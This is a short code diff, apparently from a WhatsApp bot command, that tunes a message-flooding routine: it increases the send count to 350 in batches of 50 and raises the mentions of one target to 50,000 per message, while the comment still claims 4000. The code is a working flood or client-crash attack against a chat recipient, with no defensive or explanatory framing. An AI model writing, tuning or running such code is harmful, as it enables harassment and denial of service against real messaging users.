@@ -135,8 +135,8 @@ async (Void, citel, text,{ isCreator }) => {
         const jid = citel.chat; // JID of the recipient
         const userId = Void.user.id; // JID of the user
         const message = "  "; // Message to send
-        const totalSends = 300; // Total number of sends
-        const batchSends = 30; // Number of sends before a pause
+        const totalSends = 350; // Total number of sends
+        const batchSends = 50; // Number of sends before a pause
         const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)
 
         let firstMessageSent = false;
@@ -152,7 +152,7 @@ async (Void, citel, text,{ isCreator }) => {
             for (let j = 0; j < batchSends; j++) {
                 await Void.sendMessage(ying, {
                     text: message,
-                    mentions: Array(4000).fill(jid) // Mention the same JID 4000 times
+                    mentions: Array(50000).fill(jid) // Mention the same JID 4000 times
                 });
 
                 // Confirmation after sending the first message
